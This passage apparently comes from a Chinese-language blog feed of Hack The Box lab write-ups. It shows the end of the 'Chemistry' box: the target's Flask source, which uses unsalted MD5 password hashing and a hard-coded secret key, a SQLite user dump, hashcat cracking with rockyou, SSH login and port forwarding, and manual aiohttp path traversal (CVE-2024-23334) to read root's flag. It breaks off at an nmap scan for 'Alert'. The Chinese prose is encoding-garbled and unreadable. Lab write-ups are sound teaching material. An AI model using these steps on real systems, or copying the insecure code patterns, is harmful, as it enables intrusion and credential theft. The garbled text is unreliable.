class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, flash</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask_login <span class="keyword">import</span> LoginManager, UserMixin, login_user, login_required, logout_user, current_user</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pymatgen.io.cif <span class="keyword">import</span> CifParser</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;MyS3cretCh3mistry4PP&#x27;</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="string">&#x27;sqlite:///database.db&#x27;</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;uploads/&#x27;</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;ALLOWED_EXTENSIONS&#x27;</span>] = &#123;<span class="string">&#x27;cif&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line">login_manager = LoginManager(app)</span><br><span class="line"></span><br><span class="line">login_manager.login_view = <span class="string">&#x27;login&#x27;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(UserMixin, db.Model):</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">username = db.Column(db.String(<span class="number">150</span>), nullable=<span class="literal">False</span>, unique=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">password = db.Column(db.String(<span class="number">150</span>), nullable=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Structure</span>(db.Model):</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">user_id = db.Column(db.Integer, db.ForeignKey(<span class="string">&#x27;user.id&#x27;</span>), nullable=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">filename = db.Column(db.String(<span class="number">150</span>), nullable=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">identifier = db.Column(db.String(<span class="number">100</span>), nullable=<span class="literal">False</span>, unique=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@login_manager.user_loader</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_user</span>(<span class="params">user_id</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> User.query.get(<span class="built_in">int</span>(user_id))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> app.config[<span class="string">&#x27;ALLOWED_EXTENSIONS&#x27;</span>]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_density</span>(<span class="params">structure</span>):</span><br><span class="line"></span><br><span class="line">atomic_mass_Si = <span class="number">28.0855</span></span><br><span class="line"></span><br><span class="line">num_atoms = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">mass_unit_cell = num_atoms * atomic_mass_Si</span><br><span class="line"></span><br><span class="line">mass_in_grams = mass_unit_cell * <span class="number">1.66053906660e-24</span></span><br><span class="line"></span><br><span class="line">volume_in_cm3 = structure.lattice.volume * <span class="number">1e-24</span></span><br><span class="line"></span><br><span class="line">density = mass_in_grams / volume_in_cm3</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> density</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line"></span><br><span class="line">username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line"></span><br><span class="line">password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> User.query.filter_by(username=username).first():</span><br><span class="line"></span><br><span class="line">flash(<span class="string">&#x27;Username already exists.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line"></span><br><span class="line">hashed_password = hashlib.md5(password.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">new_user = User(username=username, password=hashed_password)</span><br><span class="line"></span><br><span class="line">db.session.add(new_user)</span><br><span class="line"></span><br><span class="line">db.session.commit()</span><br><span class="line"></span><br><span class="line">login_user(new_user)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line"></span><br><span class="line">username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line"></span><br><span class="line">password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">user = User.query.filter_by(username=username).first()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> user <span class="keyword">and</span> user.password == hashlib.md5(password.encode()).hexdigest():</span><br><span class="line"></span><br><span class="line">login_user(user)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line"></span><br><span class="line">flash(<span class="string">&#x27;Invalid credentials&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line"></span><br><span class="line">logout_user()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line"></span><br><span class="line">structures = Structure.query.filter_by(user_id=current_user.<span class="built_in">id</span>).<span class="built_in">all</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, structures=structures)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line"></span><br><span class="line">filename = secure_filename(file.filename)</span><br><span class="line"></span><br><span class="line">identifier = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], identifier + <span class="string">&#x27;_&#x27;</span> + filename)</span><br><span class="line"></span><br><span class="line">file.save(filepath)</span><br><span class="line"></span><br><span class="line">new_structure = Structure(user_id=current_user.<span class="built_in">id</span>, filename=filename, identifier=identifier)</span><br><span class="line"></span><br><span class="line">db.session.add(new_structure)</span><br><span class="line"></span><br><span class="line">db.session.commit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/structure/&lt;identifier&gt;&#x27;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_structure</span>(<span class="params">identifier</span>):</span><br><span class="line"></span><br><span class="line">structure_entry = Structure.query.filter_by(identifier=identifier, user_id=current_user.<span class="built_in">id</span>).first_or_404()</span><br><span class="line"></span><br><span class="line">filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], structure_entry.identifier + <span class="string">&#x27;_&#x27;</span> + structure_entry.filename)</span><br><span class="line"></span><br><span class="line">parser = CifParser(filepath)</span><br><span class="line"></span><br><span class="line">structures = parser.parse_structures()</span><br><span class="line"></span><br><span class="line">structure_data = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> structure <span class="keyword">in</span> structures:</span><br><span class="line"></span><br><span class="line">sites = [&#123;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;label&#x27;</span>: site.species_string,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;x&#x27;</span>: site.frac_coords[<span class="number">0</span>],</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;y&#x27;</span>: site.frac_coords[<span class="number">1</span>],</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;z&#x27;</span>: site.frac_coords[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">for</span> site <span class="keyword">in</span> structure.sites]</span><br><span class="line"></span><br><span class="line">lattice = structure.lattice</span><br><span class="line"></span><br><span class="line">lattice_data = &#123;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>: lattice.a,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;b&#x27;</span>: lattice.b,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;c&#x27;</span>: lattice.c,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;alpha&#x27;</span>: lattice.alpha,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;beta&#x27;</span>: lattice.beta,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;gamma&#x27;</span>: lattice.gamma,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;volume&#x27;</span>: lattice.volume</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">density = calculate_density(structure)</span><br><span class="line"></span><br><span class="line">structure_data.append(&#123;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;formula&#x27;</span>: structure.formula,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;lattice&#x27;</span>: lattice_data,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;density&#x27;</span>: density,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;sites&#x27;</span>: sites</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;structure.html&#x27;</span>, structures=structure_data)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/delete_structure/&lt;identifier&gt;&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_structure</span>(<span class="params">identifier</span>):</span><br><span class="line"></span><br><span class="line">structure = Structure.query.filter_by(identifier=identifier, user_id=current_user.<span class="built_in">id</span>).first_or_404()</span><br><span class="line"></span><br><span class="line">filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], structure.identifier + <span class="string">&#x27;_&#x27;</span> + structure.filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line"></span><br><span class="line">os.remove(filepath)</span><br><span class="line"></span><br><span class="line">db.session.delete(structure)</span><br><span class="line"></span><br><span class="line">db.session.commit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> app.app_context():</span><br><span class="line"></span><br><span class="line">db.create_all()</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line">$</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨instanceç›®å½•ä¸‹å‘ç°äº†dbæ•°æ®åº“ï¼Œæ˜¯sqlite3çš„æ•°æ®åº“é‚£ç›´æ¥ç”¨ä»–çš„è¯­æ³•æŸ¥çœ‹å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sqlite3 /home/app/instance/database.db</span><br><span class="line"></span><br><span class="line">.table</span><br><span class="line"></span><br><span class="line">select * <span class="keyword">from</span> user;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734071455111-e39f43cc-baa8-4eb0-9e00-12607a3b8568.png"></p><p>å¯ä»¥çœ‹åˆ°æœ‰rosaçš„hashæ‰€ä»¥æ¥çˆ†ç ´ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">hashcat -m <span class="number">0</span> -a <span class="number">0</span> chem.<span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt -o cra</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œ -m è¡¨ç¤ºä¸ºmd5 hash -a 0 è¡¨ç¤ºä½¿ç”¨å­—å…¸ -o è¡¨ç¤ºè¾“å‡º</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734071939360-a2b43614-7f46-4899-8948-66466614fe0c.png"></p><p>å¾—åˆ°å¯†ç æ‰€ä»¥ç›´æ¥sshç™»å½•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734072024102-8572ff98-ae72-465f-ab6a-776157b6da1d.png"></p><p>å¾—åˆ°ä¸€ä¸ªå¯†ç </p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>æ£€æŸ¥sudoæ˜¯å¦å¯ä»¥ä½¿ç”¨ï¼Œåˆ—å‡ºæ‰€æœ‰å¯ä»¥ç”¨sudoæ‰§è¡Œçš„æ–‡ä»¶</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734072093284-05c51878-0579-4b32-8a64-9dad4421dede.png"></p><p>å‘ç°ä¸èƒ½ä½¿ç”¨ï¼Œé‚£ä¹ˆçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰å¯åŠ¨çš„å…¶ä»–æœåŠ¡netstatçœ‹ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734072196100-0de3ea05-7dd3-4ef1-a390-0110623efe85.png"></p><p>å‘ç°æœ‰ä¸€ä¸ªæœåŠ¡ï¼Œçœ‹ä¸€ä¸‹æƒé™</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734072258588-d51263ff-f915-4e8f-9697-f4ec488d7de6.png"></p><p>èƒ½å¤Ÿçœ‹åˆ°æ˜¯rootå¯åŠ¨çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬è¿˜æ˜¯è½¬å‘ä¸€ä¸‹åœ¨æˆ‘ä»¬æœ¬åœ°çœ‹ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh rosa@<span class="number">10.10</span><span class="number">.11</span><span class="number">.38</span> -L <span class="number">8080</span>:localhost:<span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734072451585-30c1d804-e17b-47d6-b07a-f64081437a51.png"></p><p>ä¹Ÿå¹¶æ²¡æœ‰å•¥æœ‰ç”¨çš„ä¿¡æ¯çœ‹çœ‹å“åº”å¤´æœ‰æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734072484245-c25b4cd8-d75f-46ac-9944-f5fea8f3c540.png"></p><p>å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨æ˜¯aiohttpé‚£ä¹ˆå»æ‰¾ä¸€ä¸‹è¿™ä¸ªæœåŠ¡å™¨æœ‰ä»€ä¹ˆæ¼æ´å—</p><p><a href="https://github.com/z3rObyte/CVE-2024-23334-PoC">https://github.com/z3rObyte/CVE-2024-23334-PoC</a>æœ‰ä¸€ä¸ªç›®å½•éå†æ¼æ´è¿™é‡Œå¯ä»¥ç”¨è„šæœ¬ä¹Ÿå¯ä»¥ç›´æ¥æ‰‹æ‰“</p><p>å°±ç›´æ¥æ‰‹åŠ¨è·å–rootçš„flagå§</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734073064450-721537ec-0a5f-4c45-a2c8-035e9df047e2.png"></p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Alert</title>
      <link href="/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Alert/"/>
      <url>/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Alert/</url>
      
        <content type="html"><![CDATA[<h2 id="nmapæ‰«æ"><a href="#nmapæ‰«æ" class="headerlink" title="nmapæ‰«æ"></a>nmapæ‰«æ</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap -sC -sV -T4 -Pn <span class="number">10.10</span><span class="number">.11</span><span class="number">.44</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734011531560-4ad35699-f24f-45de-8457-32e0d2673b19.png"></p><p>å‘ç°åŸŸåalert.htbå°†å…¶åŠ å…¥åˆ°hostsæ–‡ä»¶é‡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734011610979-27468c86-374a-4e14-9441-ff79155ee42e.png"></p><h2 id="å­åŸŸåæ‰«æ"><a href="#å­åŸŸåæ‰«æ" class="headerlink" title="å­åŸŸåæ‰«æ"></a>å­åŸŸåæ‰«æ</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 